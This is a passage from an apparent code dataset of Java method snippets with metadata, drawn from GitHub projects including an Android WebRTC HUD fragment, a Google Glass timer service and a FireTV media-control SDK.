"https://raw.githubusercontent.com/harvestcore/ipmdroid/master/app/src/main/java/com/agm/ipmanager/events/EventManager.java", "stars": "1", "class": {"name": "EventManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getEvents", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<Event>", "snippet": "    public ArrayList<Event> getEvents() {        return events;    }", "url": "https://raw.githubusercontent.com/harvestcore/ipmdroid/master/app/src/main/java/com/agm/ipmanager/events/EventManager.java", "stars": "1", "class": {"name": "EventManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "addEvent", "params": ["Event"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addEvent(Event e) {        if (events.get(0).type == EventType.NONE) {            events.clear();        }        events.add(0, e);    }", "url": "https://raw.githubusercontent.com/harvestcore/ipmdroid/master/app/src/main/java/com/agm/ipmanager/events/EventManager.java", "stars": "1", "class": {"name": "EventManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "packageCourse", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void packageCourse() {        System.out.println(\"\u63d0\u4f9b\u524d\u7aef\u8bfe\u7a0b\u4ee3\u7801\");        System.out.println(\"\u63d0\u4f9b\u524d\u7aef\u8bfe\u7a0b\u6240\u9700\u7684\u56fe\u7247\u7b49\u8d44\u6599\");    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/templatemethod/FrontEndCourse.java", "stars": "2", "class": {"name": "FrontEndCourse", "extends": "AbstractCourse", "implements": null, "modifiers": ["public"]}}, {"method_name": "isWriteNote", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean isWriteNote() {        return this.flag;    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/templatemethod/FrontEndCourse.java", "stars": "2", "class": {"name": "FrontEndCourse", "extends": "AbstractCourse", "implements": null, "modifiers": ["public"]}}, {"method_name": "newInstance", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "PlaceholderFragment", "snippet": "    public static PlaceholderFragment newInstance(int index) {        PlaceholderFragment fragment = new PlaceholderFragment();        Bundle bundle = new Bundle();        bundle.putInt(ARG_SECTION_NUMBER, index);        fragment.setArguments(bundle);        return fragment;    }", "url": "https://raw.githubusercontent.com/harvestcore/ipmdroid/master/app/src/main/java/com/agm/ipmanager/ui/main/PlaceholderFragment.java", "stars": "1", "class": {"name": "PlaceholderFragment", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        pageViewModel = ViewModelProviders.of(this).get(PageViewModel.class);        int index = 1;        if (getArguments() != null) {            index = getArguments().getInt(ARG_SECTION_NUMBER);        }        pageViewModel.setIndex(index);    }", "url": "https://raw.githubusercontent.com/harvestcore/ipmdroid/master/app/src/main/java/com/agm/ipmanager/ui/main/PlaceholderFragment.java", "stars": "1", "class": {"name": "PlaceholderFragment", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreateView", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(            @NonNull LayoutInflater inflater, ViewGroup container,            Bundle savedInstanceState) {        View root = inflater.inflate(R.layout.fragment_main, container, false);        final TextView textView = root.findViewById(R.id.section_label);        pageViewModel.getText().observe(this, new Observer<String>() {            @Override            public void onChanged(@Nullable String s) {                textView.setText(s);            }        });        return root;    }", "url": "https://raw.githubusercontent.com/harvestcore/ipmdroid/master/app/src/main/java/com/agm/ipmanager/ui/main/PlaceholderFragment.java", "stars": "1", "class": {"name": "PlaceholderFragment", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreateView", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "  public View onCreateView(      LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {    View controlView = inflater.inflate(R.layout.fragment_hud, container, false);    // Create UI controls.    encoderStatView = controlView.findViewById(R.id.encoder_stat_call);    hudViewBwe = controlView.findViewById(R.id.hud_stat_bwe);    hudViewConnection = controlView.findViewById(R.id.hud_stat_connection);    hudViewVideoSend = controlView.findViewById(R.id.hud_stat_video_send);    hudViewVideoRecv = controlView.findViewById(R.id.hud_stat_video_recv);    toggleDebugButton = controlView.findViewById(R.id.button_toggle_debug);    toggleDebugButton.setOnClickListener(new View.OnClickListener() {      @Override      public void onClick(View view) {        if (displayHud) {          int visibility =              (hudViewBwe.getVisibility() == View.VISIBLE) ? View.INVISIBLE : View.VISIBLE;          hudViewsSetProperties(visibility);        }      }    });    return controlView;  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/HudFragment.java", "stars": "2", "class": {"name": "HudFragment", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onStart", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void onStart() {    super.onStart();    Bundle args = getArguments();    if (args != null) {      videoCallEnabled = args.getBoolean(CallActivity.EXTRA_VIDEO_CALL, true);      displayHud = args.getBoolean(CallActivity.EXTRA_DISPLAY_HUD, false);    }    int visibility = displayHud ? View.VISIBLE : View.INVISIBLE;    encoderStatView.setVisibility(visibility);    toggleDebugButton.setVisibility(visibility);    hudViewsSetProperties(View.INVISIBLE);    isRunning = true;  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/HudFragment.java", "stars": "2", "class": {"name": "HudFragment", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onStop", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void onStop() {    isRunning = false;    super.onStop();  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/HudFragment.java", "stars": "2", "class": {"name": "HudFragment", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "setCpuMonitor", "params": ["CpuMonitor"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setCpuMonitor(CpuMonitor cpuMonitor) {    this.cpuMonitor = cpuMonitor;  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/HudFragment.java", "stars": "2", "class": {"name": "HudFragment", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "hudViewsSetProperties", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void hudViewsSetProperties(int visibility) {    hudViewBwe.setVisibility(visibility);    hudViewConnection.setVisibility(visibility);    hudViewVideoSend.setVisibility(visibility);    hudViewVideoRecv.setVisibility(visibility);    hudViewBwe.setTextSize(TypedValue.COMPLEX_UNIT_PT, 5);    hudViewConnection.setTextSize(TypedValue.COMPLEX_UNIT_PT, 5);    hudViewVideoSend.setTextSize(TypedValue.COMPLEX_UNIT_PT, 5);    hudViewVideoRecv.setTextSize(TypedValue.COMPLEX_UNIT_PT, 5);  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/HudFragment.java", "stars": "2", "class": {"name": "HudFragment", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "getReportMap", "params": ["StatsReport"], "throws": null, "modifiers": ["private"], "return_type": "Map<String,String>", "snippet": "  private Map<String, String> getReportMap(StatsReport report) {    Map<String, String> reportMap = new HashMap<>();    for (StatsReport.Value value : report.values) {      reportMap.put(value.name, value.value);    }    return reportMap;  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/HudFragment.java", "stars": "2", "class": {"name": "HudFragment", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "updateEncoderStatistics", "params": ["StatsReport"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void updateEncoderStatistics(final StatsReport[] reports) {    if (!isRunning || !displayHud) {      return;    }    StringBuilder encoderStat = new StringBuilder(128);    StringBuilder bweStat = new StringBuilder();    StringBuilder connectionStat = new StringBuilder();    StringBuilder videoSendStat = new StringBuilder();    StringBuilder videoRecvStat = new StringBuilder();    String fps = null;    String targetBitrate = null;    String actualBitrate = null;    for (StatsReport report : reports) {      if (report.type.equals(\"ssrc\") && report.id.contains(\"ssrc\") && report.id.contains(\"send\")) {        // Send video statistics.        Map<String, String> reportMap = getReportMap(report);        String trackId = reportMap.get(\"googTrackId\");        if (trackId != null && trackId.contains(PeerConnectionClient.VIDEO_TRACK_ID)) {          fps = reportMap.get(\"googFrameRateSent\");          videoSendStat.append(report.id).append(\"\\n\");          for (StatsReport.Value value : report.values) {            String name = value.name.replace(\"goog\", \"\");            videoSendStat.append(name).append(\"=\").append(value.value).append(\"\\n\");          }        }      } else if (report.type.equals(\"ssrc\") && report.id.contains(\"ssrc\")          && report.id.contains(\"recv\")) {        // Receive video statistics.        Map<String, String> reportMap = getReportMap(report);        // Check if this stat is for video track.        String frameWidth = reportMap.get(\"googFrameWidthReceived\");        if (frameWidth != null) {          videoRecvStat.append(report.id).append(\"\\n\");          for (StatsReport.Value value : report.values) {            String name = value.name.replace(\"goog\", \"\");            videoRecvStat.append(name).append(\"=\").append(value.value).append(\"\\n\");          }        }      } else if (report.id.equals(\"bweforvideo\")) {        // BWE statistics.        Map<String, String> reportMap = getReportMap(report);        targetBitrate = reportMap.get(\"googTargetEncBitrate\");        actualBitrate = reportMap.get(\"googActualEncBitrate\");        bweStat.append(report.id).append(\"\\n\");        for (StatsReport.Value value : report.values) {          String name = value.name.replace(\"goog\", \"\").replace(\"Available\", \"\");          bweStat.append(name).append(\"=\").append(value.value).append(\"\\n\");        }      } else if (report.type.equals(\"googCandidatePair\")) {        // Connection statistics.        Map<String, String> reportMap = getReportMap(report);        String activeConnection = reportMap.get(\"googActiveConnection\");        if (activeConnection != null && activeConnection.equals(\"true\")) {          connectionStat.append(report.id).append(\"\\n\");          for (StatsReport.Value value : report.values) {            String name = value.name.replace(\"goog\", \"\");            connectionStat.append(name).append(\"=\").append(value.value).append(\"\\n\");          }        }      }    }    hudViewBwe.setText(bweStat.toString());    hudViewConnection.setText(connectionStat.toString());    hudViewVideoSend.setText(videoSendStat.toString());    hudViewVideoRecv.setText(videoRecvStat.toString());    if (videoCallEnabled) {      if (fps != null) {        encoderStat.append(\"Fps:  \").append(fps).append(\"\\n\");      }      if (targetBitrate != null) {        encoderStat.append(\"Target BR: \").append(targetBitrate).append(\"\\n\");      }      if (actualBitrate != null) {        encoderStat.append(\"Actual BR: \").append(actualBitrate).append(\"\\n\");      }    }    if (cpuMonitor != null) {      encoderStat.append(\"CPU%: \")          .append(cpuMonitor.getCpuUsageCurrent())          .append(\"/\")          .append(cpuMonitor.getCpuUsageAverage())          .append(\". Freq: \")          .append(cpuMonitor.getFrequencyScaleAverage());    }    encoderStatView.setText(encoderStat.toString());  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/HudFragment.java", "stars": "2", "class": {"name": "HudFragment", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreate", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate() {        super.onCreate();        mTimelineManager = TimelineManager.from(this);        mTimerDrawer = new TimerDrawer(this);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Timer/src/com/google/android/glass/sample/timer/TimerService.java", "stars": "74", "class": {"name": "TimerService", "extends": "Service", "implements": null, "modifiers": ["public"]}}, {"method_name": "onBind", "params": ["Intent"], "throws": null, "modifiers": ["public"], "return_type": "IBinder", "snippet": "    public IBinder onBind(Intent intent) {        return mBinder;    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Timer/src/com/google/android/glass/sample/timer/TimerService.java", "stars": "74", "class": {"name": "TimerService", "extends": "Service", "implements": null, "modifiers": ["public"]}}, {"method_name": "onStartCommand", "params": ["Intent", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int onStartCommand(Intent intent, int flags, int startId) {        if (mLiveCard == null) {            mLiveCard = mTimelineManager.createLiveCard(LIVE_CARD_TAG);            mLiveCard.setDirectRenderingEnabled(true).getSurfaceHolder().addCallback(mTimerDrawer);            Intent menuIntent = new Intent(this, MenuActivity.class);            menuIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);            mLiveCard.setAction(PendingIntent.getActivity(this, 0, menuIntent, 0));            mLiveCard.publish(PublishMode.REVEAL);        } else {            // TODO(alainv): Jump to the LiveCard when API is available.        }        return START_STICKY;    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Timer/src/com/google/android/glass/sample/timer/TimerService.java", "stars": "74", "class": {"name": "TimerService", "extends": "Service", "implements": null, "modifiers": ["public"]}}, {"method_name": "onDestroy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDestroy() {        if (mLiveCard != null && mLiveCard.isPublished()) {            mLiveCard.getSurfaceHolder().removeCallback(mTimerDrawer);            mLiveCard.unpublish();            mLiveCard = null;            mTimerDrawer.getTimer().reset();        }        super.onDestroy();    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Timer/src/com/google/android/glass/sample/timer/TimerService.java", "stars": "74", "class": {"name": "TimerService", "extends": "Service", "implements": null, "modifiers": ["public"]}}, {"method_name": "getTimer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Timer", "snippet": "        public Timer getTimer() {            return mTimerDrawer.getTimer();        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Timer/src/com/google/android/glass/sample/timer/TimerService.java", "stars": "74", "class": {"name": "TimerBinder", "extends": "Binder", "implements": null, "modifiers": ["public"]}}, {"method_name": "getConfiguration", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "  protected String getConfiguration() {    return \"javassist\";  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_proxyfactory_comparison/JavassistLazyTest.java", "stars": "15", "class": {"name": "JavassistLazyTest", "extends": "AbstractLazyTest", "implements": null, "modifiers": ["public"]}}, {"method_name": "discoveryFilter", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "DiscoveryFilter", "snippet": "    public static DiscoveryFilter discoveryFilter() {        return new DiscoveryFilter(ID, \"FireTV\");    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "connect", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void connect() {        super.connect();        if (remoteMediaPlayer != null) {            connected = true;            reportConnected(connected);        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "isConnected", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isConnected() {        return connected;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "isConnectable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isConnectable() {        return true;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "disconnect", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void disconnect() {        super.disconnect();        if (playStateSubscription != null) {            playStateSubscription.unsubscribe();        }        connected = false;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "updateCapabilities", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void updateCapabilities() {        List<String> capabilities = new ArrayList<String>();        capabilities.add(MediaPlayer.MediaInfo_Get);        capabilities.add(MediaPlayer.Display_Image);        capabilities.add(MediaPlayer.Play_Audio);        capabilities.add(MediaPlayer.Play_Video);        capabilities.add(MediaPlayer.Close);        capabilities.add(MediaPlayer.MetaData_MimeType);        capabilities.add(MediaPlayer.MetaData_Thumbnail);        capabilities.add(MediaPlayer.MetaData_Title);        capabilities.add(MediaPlayer.Subtitles_Vtt);        capabilities.add(MediaControl.Play);        capabilities.add(MediaControl.Pause);        capabilities.add(MediaControl.Stop);        capabilities.add(MediaControl.Seek);        capabilities.add(MediaControl.Duration);        capabilities.add(MediaControl.Position);        capabilities.add(MediaControl.PlayState);        capabilities.add(MediaControl.PlayState_Subscribe);        setCapabilities(capabilities);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "getPriorityLevel", "params": ["Class<CapabilityMethods>"], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getPriorityLevel(Class<? extends CapabilityMethods> clazz) {        if (clazz.equals(MediaPlayer.class)) {            return getMediaPlayerCapabilityLevel();        } else if (clazz.equals(MediaControl.class)) {            return getMediaControlCapabilityLevel();        }        return CapabilityPriorityLevel.NOT_SUPPORTED;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "getMediaPlayer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MediaPlayer", "snippet": "    public MediaPlayer getMediaPlayer() {        return this;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "getMediaPlayerCapabilityLevel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getMediaPlayerCapabilityLevel() {        return CapabilityPriorityLevel.HIGH;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "getMediaInfo", "params": ["MediaInfoListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getMediaInfo(final MediaInfoListener listener) {        final String error = \"Error getting media info\";        RemoteMediaPlayer.AsyncFuture<MediaPlayerInfo> asyncFuture = null;        try {            asyncFuture = remoteMediaPlayer.getMediaInfo();            handleAsyncFutureWithConversion(listener, asyncFuture,                    new ConvertResult<MediaInfo, MediaPlayerInfo>() {                @Override                public MediaInfo convert(MediaPlayerInfo data) throws JSONException {                    JSONObject metaJson = null;                    metaJson = new JSONObject(data.getMetadata());                    List<ImageInfo> images = null;                    if (metaJson.has(META_ICON_IMAGE)) {                        images = new ArrayList<ImageInfo>();                        images.add(new ImageInfo(metaJson.getString(META_ICON_IMAGE)));                    }                    MediaInfo mediaInfo = new MediaInfo(data.getSource(),                            metaJson.getString(META_MIME_TYPE), metaJson.getString(META_TITLE),                            metaJson.getString(META_DESCRIPTION), images);                    return mediaInfo;                }            }, error);        } catch (Exception e) {            Util.postError(listener, new FireTVServiceError(error));            return;        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "subscribeMediaInfo", "params": ["MediaInfoListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<MediaInfoListener>", "snippet": "    public ServiceSubscription<MediaInfoListener> subscribeMediaInfo(MediaInfoListener listener) {        Util.postError(listener, ServiceCommandError.notSupported());        return null;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "displayImage", "params": ["String", "String", "String", "String", "String", "LaunchListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void displayImage(String url, String mimeType, String title, String description,                             String iconSrc, final LaunchListener listener) {        setMediaSource(url, null, mimeType, title, description, iconSrc, listener);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "playMedia", "params": ["String", "String", "String", "String", "String", "boolean", "LaunchListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void playMedia(String url, String mimeType, String title, String description,                          String iconSrc, boolean shouldLoop, LaunchListener listener) {        setMediaSource(url, null, mimeType, title, description, iconSrc, listener);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "closeMedia", "params": ["LaunchSession", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void closeMedia(LaunchSession launchSession, final ResponseListener<Object> listener) {        stop(listener);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "displayImage", "params": ["MediaInfo", "LaunchListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void displayImage(MediaInfo mediaInfo, LaunchListener listener) {        setMediaSourceFromMediaInfo(mediaInfo, listener);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "playMedia", "params": ["MediaInfo", "boolean", "LaunchListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void playMedia(MediaInfo mediaInfo, boolean shouldLoop, LaunchListener listener) {        setMediaSourceFromMediaInfo(mediaInfo, listener);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "getMediaControl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MediaControl", "snippet": "    public MediaControl getMediaControl() {        return this;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "getMediaControlCapabilityLevel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getMediaControlCapabilityLevel() {        return CapabilityPriorityLevel.HIGH;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "play", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void play(ResponseListener<Object> listener) {        final String error = \"Error playing\";        RemoteMediaPlayer.AsyncFuture<Void> asyncFuture = null;        try {            asyncFuture = remoteMediaPlayer.play();            handleVoidAsyncFuture(listener, asyncFuture, error);        } catch (Exception e) {            Util.postError(listener, new FireTVServiceError(error, e));        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "pause", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pause(ResponseListener<Object> listener) {        final String error = \"Error pausing\";        RemoteMediaPlayer.AsyncFuture<Void> asyncFuture = null;        try {            asyncFuture = remoteMediaPlayer.pause();            handleVoidAsyncFuture(listener, asyncFuture, error);        } catch (Exception e) {            Util.postError(listener, new FireTVServiceError(error, e));        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "stop", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void stop(ResponseListener<Object> listener) {        final String error = \"Error stopping\";        RemoteMediaPlayer.AsyncFuture<Void> asyncFuture = null;        try {            asyncFuture = remoteMediaPlayer.stop();            handleVoidAsyncFuture(listener, asyncFuture, error);        } catch (Exception e) {            Util.postError(listener, new FireTVServiceError(error, e));        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "rewind", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void rewind(ResponseListener<Object> listener) {        Util.postError(listener, ServiceCommandError.notSupported());    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "fastForward", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void fastForward(ResponseListener<Object> listener) {        Util.postError(listener, ServiceCommandError.notSupported());    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "previous", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void previous(ResponseListener<Object> listener) {        Util.postError(listener, ServiceCommandError.notSupported());    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "next", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void next(ResponseListener<Object> listener) {        Util.postError(listener, ServiceCommandError.notSupported());    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "seek", "params": ["long", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void seek(long position, ResponseListener<Object> listener) {        final String error = \"Error seeking\";        RemoteMediaPlayer.AsyncFuture<Void> asyncFuture = null;        try {            asyncFuture = remoteMediaPlayer.seek(CustomMediaPlayer.PlayerSeekMode.Absolute,                    position);            handleVoidAsyncFuture(listener, asyncFuture, error);        } catch 